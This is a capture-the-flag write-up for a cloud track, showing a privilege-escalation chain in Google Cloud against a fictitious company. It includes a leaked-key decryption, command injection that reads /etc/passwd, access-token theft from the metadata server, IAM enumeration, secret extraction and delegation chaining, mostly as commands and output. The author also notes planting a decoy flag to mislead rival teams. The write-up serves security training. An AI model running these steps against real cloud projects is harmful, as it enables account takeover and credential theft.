# Learn The Alphabet

The main goal of the track was to find a GCP to Google Workspace privliege pivot / escelation to compromise the CEO's email.

## Flag 05

We're provided with `CompanyLogo.PNG` that makes reference to a ficiticious company called MySuperAISaaS. Through Google, I found a GitHub repository https://github.com/mysuperaisaas/superaisaas which contained the flag in `README.md`:

```
Flag 5 - HF-67e4a7d0d044f147facc9d94c4002998
```

Note: Although it says "Flag 5" this flag was actually valid as the 1st and (something?) flag. It might have been the first and 5th flag, but I forget.

More OpSec on Google later uncovered https://www.linkedin.com/company/my-super-ai-saas/ with a comment on one of the posts containing a LinkedIn comment with the same flag:

![LinkedIn Comment](linkedin_comment.png)

## Flag 06

I cloned the GitHub repository and looked at the commits.

```console
$ git clone https://github.com/mysuperaisaas/superaisaas.git
$ cd superaisaas
$ git log | head -n 5
commit 4f738dfc0cf8c1dd990abbed23ede81c850d08e1
Author: rclark23 <robert.clark@mysuperaisaas.com>
Date:   Sun Oct 12 22:18:49 2025 -0400

    Working on deleting unsecure commits
```

This commit contained a file called `encrypted_sa.txt` which contained a JSON object with AES256 encrypted data and a line deleted from the README that said:

```diff
diff --git a/README.md b/README.md
index 3f81449..8d83b84 100644
--- a/README.md
+++ b/README.md
@@ -32,7 +32,7 @@ cp .env.example .env
 npm run dev
 ```

-@rclark23 I have added the service account key in case you require it for some testing to deploy cloud run functions, do not worry I encrypt it with a secure pwd : **MySuperAISaaS123**
+--> Deleting unsecure comments done by @Jonathan Lee

 ### 📋 Prerequisites
```

There's a Python file in the repo called `decryptJSON.py` that then returns unencrypted Google Cloud Platform (GCP) service account JSON credentials for the user `initial-sa@aisaas-project-474522.iam.gserviceaccount.com`.

Using those credentials, I discovered that we have access to `gcloud run` commands:

```console
[MacBook-Pro hackfest]$ gcloud run services list --region northamerica-northeast1 --project aisaas-project-474522
   SERVICE                REGION                   URL                                                                         LAST DEPLOYED BY                  LAST DEPLOYED AT
✔  cloudfunction1-hf2025  northamerica-northeast1  https://cloudfunction1-hf2025-753482425537.northamerica-northeast1.run.app  tyrell.wellick@mysuperaisaas.com  2025-10-13T14:23:46.223112Z
```

One interesting note is that the code running in GCP doesn't match the code that's in the repository.

From there, listing service revisions shows:

(I forget the specific command I ran to do this)

```console
   REVISION                         ACTIVE  SERVICE                DEPLOYED                 DEPLOYED BY
✔  cloudfunction1-hf2025-00007-sw6  yes     cloudfunction1-hf2025  2025-10-13 14:23:39 UTC  tyrell.wellick@mysuperaisaas.com
✔  cloudfunction1-hf2025-00006-thd          cloudfunction1-hf2025  2025-10-13 05:27:46 UTC  tyrell.wellick@mysuperaisaas.com
✔  cloudfunction1-hf2025-00005-8f8          cloudfunction1-hf2025  2025-10-13 05:25:28 UTC  tyrell.wellick@mysuperaisaas.com
✔  cloudfunction1-hf2025-00004-522          cloudfunction1-hf2025  2025-10-13 05:22:08 UTC  tyrell.wellick@mysuperaisaas.com
✔  cloudfunction1-hf2025-00003-8k8          cloudfunction1-hf2025  2025-10-13 05:10:11 UTC  tyrell.wellick@mysuperaisaas.com
✔  cloudfunction1-hf2025-00002-nkf          cloudfunction1-hf2025  2025-10-13 04:21:54 UTC  tyrell.wellick@mysuperaisaas.com
✔  cloudfunction1-hf2025-00001-kkc          cloudfunction1-hf2025  2025-10-13 03:52:18 UTC  tyrell.wellick@mysuperaisaas.com
```

And describing the latest revision of the service gives the flag:

```console
$ gcloud run revisions describe cloudfunction1-hf2025-00005-8f
To make this the default region, run `gcloud config set run/region northamerica-northeast1`.

✔ Revision cloudfunction1-hf2025-00007-sw6 in region northamerica-northeast1

Container cloudfunction1-hf2025-1
  Image:             northamerica-northeast1-docker.pkg.dev/aisaas-project-474522/cloud-run-source-deploy/cloudfunction1-hf2025@sha256:6284381bcfc72a7d4b776bd609ea3df04486dd80faad80196861b924bcc6d68f
  Base Image:        northamerica-northeast1-docker.pkg.dev/serverless-runtimes/google-22/runtimes/python310
  Port:              8080
  Memory:            512Mi
  CPU:               1000m
  Env vars:
    Flag-6           HF-83bcb432a85e61395248270522818bf1
  Startup Probe:
    TCP every 240s
    Port:            8080
    Initial delay:   0s
    Timeout:         240s
    Failure threshold: 1
    Type:            Default
Service account:     function-sa@aisaas-project-474522.iam.gserviceaccount.com
Concurrency:         80
Max instances:       2
Timeout:             300s
Execution Environment: First Generation
✔ Deploying revision succeeded in 4.45s.
```

## Flag 07

I discovered the [`gcloud run services proxy`](https://cloud.google.com/sdk/gcloud/reference/run/services/proxy) command which let me proxy the running function to `localhost`:

```console
[MacBook-Pro ~]$ gcloud run services proxy cloudfunction1-hf2025 --port 8080
Proxying to Cloud Run service [cloudfunction1-hf2025] in project [aisaas-project-474522] region [northamerica-northeast1]
http://127.0.0.1:8080/ proxies to https://cloudfunction1-hf2025-6htansbyrq-nn.a.run.app/
```

From there,

```console
$ curl http://127.0.0.1:8080/
{"status": "success", "message": "Welcome to MySuperAISaaS Cloud Function", "flag": "Flag-7 : HF-280b69759b56048c6f0799a4ceb2676a", "hint": "Try the 'local' endpoint with a 'com' parameter for tests and diagnostics"}
```

## Flag 08

Following the hint from the last flag, we find an endpoint that allows remote code execution:

```console
$ curl http://127.0.0.1:8080/?com=cat%20%2Fetc%2Fpasswd
HTTP/1.1 200 OK
Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
Content-Length: 982
Content-Type: application/json
Date: Fri, 17 Oct 2025 04:45:05 GMT
Server: Google Frontend
X-Cloud-Trace-Context: 199b5c8733e8baf891b1bf9e9f276c9c
Connection: close

{"status": "success", "output": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/www-data-home:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n"}
```

I had ChatGPT built a small shell to make it easier to exploit this endpoint. That's saved as `shell.py`.

From there, we find lots of files in `/tmp`.

For example:

```bash
#!/bin/bash
# Test Gmail API from within Cloud Function context
TOKEN=$(curl -s -H \"Metadata-Flavor: Google\" \"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\" | python3 -c \"import sys,json; print(json.load(sys.stdin)['access_token'])\")
echo \"Token obtained: ${TOKEN:0:50}...\"
echo \"\"
echo \"Testing Gmail API from function context:\"
curl -s -H \"Authorization: Bearer $TOKEN\" \"https://gmail.googleapis.com/gmail/v1/users/tyrell.wellick@mysuperaisaas.com/messages?maxResults=1\"
```

From here, I have two realizations. 1) this is a shared challenge VM, there's a web app that you're dropped into as the working directory, so we should leave a fake `flag.jpeg` to distract the other teams. 2) we can probably assume the GCP equivalent of an AWS instance profile to eseclate our privlieges.


I generated a GCP access token using Google's metadata endpoint:

http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

 Then, I used [Thunder CTF's](https://github.com/NicholasSpringer/thunder-ctf) `test-permissions.py` to enumerate permissions for the `function-sa@aisaas-project-474522.iam.gserviceaccount.com` user:

```
Access token: ya29...iOtF
['iam.roles.get', 'iam.roles.list', 'iam.serviceAccounts.get', 'iam.serviceAccounts.getIamPolicy', 'iam.serviceAccounts.list', 'resourcemanager.projects.get', 'resourcemanager.projects.getIamPolicy']
```

From there, we get a complete list of all the service accounts:

```
[MacBook-Pro scripts] (master)$ gcloud iam service-accounts list
DISPLAY NAME                        EMAIL                                                            DISABLED
App Engine default service account  aisaas-project-474522@appspot.gserviceaccount.com                False
sa-implicit-c                       sa-implicit-c@aisaas-project-474522.iam.gserviceaccount.com      False
docker-sa                           docker-sa@aisaas-project-474522.iam.gserviceaccount.com          False
vm-serviceaccount                   vm-serviceaccount@aisaas-project-474522.iam.gserviceaccount.com  False
sa-implicit-a                       sa-implicit-a@aisaas-project-474522.iam.gserviceaccount.com      False
function-sa                         function-sa@aisaas-project-474522.iam.gserviceaccount.com        False
sa-secretmgr                        sa-secretmgr@aisaas-project-474522.iam.gserviceaccount.com       False
initial-sa                          initial-sa@aisaas-project-474522.iam.gserviceaccount.com         False
sa-implicit-b                       sa-implicit-b@aisaas-project-474522.iam.gserviceaccount.com      False
Default compute service account     753482425537-compute@developer.gserviceaccount.com               False
```

We might have had access to this list before, but before Thunder CTF I didn't know that this was a feature of GCP.


We discovered the IAM policy for the project:

```console
[MacBook-Pro scripts] (master)$ gcloud projects get-iam-policy aisaas-project-474522
```

```yaml
bindings:
- members:
  - serviceAccount:sa-implicit-a@aisaas-project-474522.iam.gserviceaccount.com
  role: projects/aisaas-project-474522/roles/HINT_Check_resources_based_permissions_GCP_can_do_resource_based
- members:
  - serviceAccount:function-sa@aisaas-project-474522.iam.gserviceaccount.com
  role: projects/aisaas-project-474522/roles/artifactRegistryRO
- members:
  - serviceAccount:sa-secretmgr@aisaas-project-474522.iam.gserviceaccount.com
  role: projects/aisaas-project-474522/roles/secretmgrcustom
- members:
  - serviceAccount:function-sa@aisaas-project-474522.iam.gserviceaccount.com
  - serviceAccount:sa-implicit-a@aisaas-project-474522.iam.gserviceaccount.com
  - serviceAccount:sa-implicit-b@aisaas-project-474522.iam.gserviceaccount.com
  - serviceAccount:sa-implicit-c@aisaas-project-474522.iam.gserviceaccount.com
  - serviceAccount:sa-secretmgr@aisaas-project-474522.iam.gserviceaccount.com
  - serviceAccount:vm-serviceaccount@aisaas-project-474522.iam.gserviceaccount.com
  role: projects/aisaas-project-474522/roles/serviceAccountViewOnly
- members:
  - serviceAccount:sa-implicit-c@aisaas-project-474522.iam.gserviceaccount.com
  role: projects/aisaas-project-474522/roles/setmedatacustom
- members:
  - serviceAccount:function-sa@aisaas-project-474522.iam.gserviceaccount.com
  role: roles/artifactregistry.reader
- members:
  - serviceAccount:service-753482425537@gcp-sa-artifactregistry.iam.gserviceaccount.com
  role: roles/artifactregistry.serviceAgent
- members:
  - serviceAccount:753482425537@cloudbuild.gserviceaccount.com
  role: roles/cloudbuild.builds.builder
- members:
  - serviceAccount:service-753482425537@gcp-sa-cloudbuild.iam.gserviceaccount.com
  role: roles/cloudbuild.serviceAgent
- members:
  - serviceAccount:service-753482425537@gcf-admin-robot.iam.gserviceaccount.com
  role: roles/cloudfunctions.serviceAgent
- members:
  - serviceAccount:sa-implicit-c@aisaas-project-474522.iam.gserviceaccount.com
  role: roles/compute.osLogin
- members:
  - serviceAccount:service-753482425537@compute-system.iam.gserviceaccount.com
  role: roles/compute.serviceAgent
- members:
  - serviceAccount:sa-implicit-c@aisaas-project-474522.iam.gserviceaccount.com
  role: roles/compute.viewer
- members:
  - serviceAccount:service-753482425537@containerregistry.iam.gserviceaccount.com
  role: roles/containerregistry.ServiceAgent
- members:
  - serviceAccount:753482425537@cloudservices.gserviceaccount.com
  role: roles/editor
- members:
  - user:tyrell.wellick@mysuperaisaas.com
  role: roles/owner
- members:
  - serviceAccount:service-753482425537@gcp-sa-pubsub.iam.gserviceaccount.com
  role: roles/pubsub.serviceAgent
- members:
  - serviceAccount:753482425537-compute@developer.gserviceaccount.com
  role: roles/run.builder
- members:
  - serviceAccount:service-753482425537@serverless-robot-prod.iam.gserviceaccount.com
  role: roles/run.serviceAgent
- members:
  - serviceAccount:initial-sa@aisaas-project-474522.iam.gserviceaccount.com
  role: roles/run.viewer
- members:
  - user:tyrell.wellick@mysuperaisaas.com
  role: roles/storage.admin
etag: BwZBJM9XqlA=
version: 1
```

Which showed that `function-sa@aisaas-project-474522.iam.gserviceaccount.com` had access to the `roles/artifactregistry.reader` IAM role. From there, flag 8 is in the container image:

```yaml
- members:
  - serviceAccount:function-sa@aisaas-project-474522.iam.gserviceaccount.com
  role: projects/aisaas-project-474522/roles/artifactRegistryRO
```

Found `northamerica-northeast1-docker.pkg.dev/aisaas-project-474522/dockervmhackfest25/mysuperaisaas` image in the registry

Pulled it

```console
$ docker run -it --entrypoint /bin/sh northamerica-northeast1-docker.pkg.dev/aisaas-project-474522/dockervmhackfest25/mysuperaisaas:latest
WARNING: The requested image's platform (linux/amd64) does not match the detected host platform (linux/arm64/v8) and no specific platform was requested
# cd /root
# ls -al
total 36
drwx------ 1 root root 4096 Oct 21 11:15 .
drwxr-xr-x 1 root root 4096 Oct 21 11:15 ..
-rw-r--r-- 1 root root  571 Apr 10  2021 .bashrc
drwxr-xr-x 3 root root 4096 Oct 21 11:15 .cache
drwxr-xr-x 1 root root 4096 Oct 13 21:03 .gcp
-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
drwx------ 1 root root 4096 Oct 13 21:03 .ssh
-rw------- 1 root root   43 Oct 13 21:03 Flag-8.txt
drwxr-xr-x 1 root root 4096 Oct 13 21:03 backups
# cat Flag-8.txt
Flag-8
HF-c13da63184a5eb5993e77fc9c92c5db0
```

## Flag 09

In the container image we just pulled, we found credentials for the `sa-secretmgr@aisaas-project-474522.iam.gserviceaccount.com` service account:

```console
# cat Flag-8.txt
Flag-8
HF-c13da63184a5eb5993e77fc9c92c5db0
# ls -al .gcp
total 12
drwxr-xr-x 1 root root 4096 Oct 13 21:03 .
drwx------ 1 root root 4096 Oct 21 11:15 ..
-rw------- 1 root root 2385 Oct 13 16:23 service-account-key.json
# cat .gcp/service-account-key.json
{
  "type": "service_account",
  "project_id": "aisaas-project-474522",
  "private_key_id": "e1bc7b3afcdd5ad98882b85ca0bd6d4672545966",
  "private_key": "-----BEGIN PRIVATE KEY-----\n[redacted]\n-----END PRIVATE KEY-----\n",
  "client_email": "sa-secretmgr@aisaas-project-474522.iam.gserviceaccount.com",
  "client_id": "107941369001496429040",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/sa-secretmgr%40aisaas-project-474522.iam.gserviceaccount.com",
  "universe_domain": "googleapis.com"
}
```

```
$ gcloud iam roles describe --project aisaas-project-474522 secretmgrcustom
description: 'Created on: 2025-10-14'
etag: BwZBH3nJlo0=
includedPermissions:
- secretmanager.secrets.getIamPolicy
- secretmanager.secrets.list
- secretmanager.versions.access
- secretmanager.versions.list
name: projects/aisaas-project-474522/roles/secretmgrcustom
stage: ALPHA
title: secretmgr-custom
```

[MacBook-Pro learn-the-alphabet]$ gcloud secrets list
NAME                          CREATED              REPLICATION_POLICY  LOCATIONS
Super_Secret_Service_Account  2025-10-14T14:28:01  automatic           -
```

Here, we find a flag, as well as credentials for the `sa-implicit-a@aisaas-project-474522.iam.gserviceaccount.com` service account:

```console
[MacBook-Pro ~]$ gcloud secrets versions access --secret Super_Secret_Service_Account 1
Flag-9

HF-a7e0ee7b5a738703b4584e61068fbaff

{
  "type": "service_account",
  "project_id": "aisaas-project-474522",
  "private_key_id": "bbc0f98a20511219fb655aa859e685b148b0697f",
  "private_key": "-----BEGIN PRIVATE KEY-----\n[redacted]\n-----END PRIVATE KEY-----\n",
  "client_email": "sa-implicit-a@aisaas-project-474522.iam.gserviceaccount.com",
  "client_id": "114630546428669668908",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/sa-implicit-a%40aisaas-project-474522.iam.gserviceaccount.com",
  "universe_domain": "googleapis.com"
}%
```

## Flag 10

We saw a role attached to `sa-implicit-a` named `HINT_Check_resources_based_permissions_GCP_can_do_resource_based`.

```
[MacBook-Pro ~]$ gcloud iam roles describe --project aisaas-project-474522 HINT_Check_resources_based_permissions_GCP_can_do_resource_based
description: 'Created on: 2025-10-14'
etag: BwZBH-BukrE=
includedPermissions:
- iam.serviceAccounts.list
name: projects/aisaas-project-474522/roles/HINT_Check_resources_based_permissions_GCP_can_do_resource_based
```

I saw `sa-implicit-b`, `sa-implicit-c`, etc. and figured we needed to some how assume those roles.

I asked ChatGPT if we could enumerate which roles I had permission to assume somehow.

https://chatgpt.com/share/e/68f76cd6-dc9c-8007-8c0d-93372d2bfd4f

based GPT helped me do

```bash
# List all SAs
gcloud iam service-accounts list --project aisaas-project-474522 --format="value(email)"

# Check each SA’s own IAM policy for tokenCreator/user
for sa in $(gcloud iam service-accounts list --project aisaas-project-474522 --format="value(email)"); do
  echo "== $sa ==";
  gcloud iam service-accounts get-iam-policy "$sa" \
    --project aisaas-project-474522 \
    --format="yaml(bindings)"
done | sed 's/privateKey/privateKey/g'   # (just avoiding accidental terminal copying)
```

which showed we had access to assume `sa-implicit-b`


```console
== sa-implicit-b@aisaas-project-474522.iam.gserviceaccount.com ==
bindings:
- members:
  - serviceAccount:sa-implicit-a@aisaas-project-474522.iam.gserviceaccount.com
  role: projects/aisaas-project-474522/roles/implicitdelegationcustom
== 753482425537-compute@developer.gserviceaccount.com ==

```console
[MacBook-Pro learn-the-alphabet]$ gcloud iam roles describe --project aisaas-project-474522 implicitdelegationcustom
description: 'Created on: 2025-10-14'
etag: BwZBIEg6Ghg=
includedPermissions:
- iam.serviceAccounts.implicitDelegation
- iam.serviceAccounts.list
name: projects/aisaas-project-474522/roles/implicitdelegationcustom
stage: ALPHA
title: implicitdelegation-custom
```

we didn't have explicit permissions to generate a token for B but can delegate B to generate a token for C
